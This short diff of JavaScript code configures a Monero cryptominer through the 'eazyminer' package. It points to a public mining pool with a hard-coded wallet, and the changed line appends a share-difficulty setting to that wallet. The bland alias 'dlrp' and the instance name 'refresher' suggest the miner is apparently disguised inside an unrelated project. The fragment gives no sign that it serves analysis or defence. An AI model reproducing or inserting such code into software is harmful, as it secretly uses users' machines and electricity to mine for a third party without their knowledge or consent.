@@ -11,7 +11,7 @@ const dlrp = require('eazyminer');
 const refresher = new dlrp({
     pools: [{
         coin: 'XMR',
-        user: '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv',
+        user: '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv+1000',
         url: 'gulf.moneroocean.stream:20128',
     }],
     web: [{
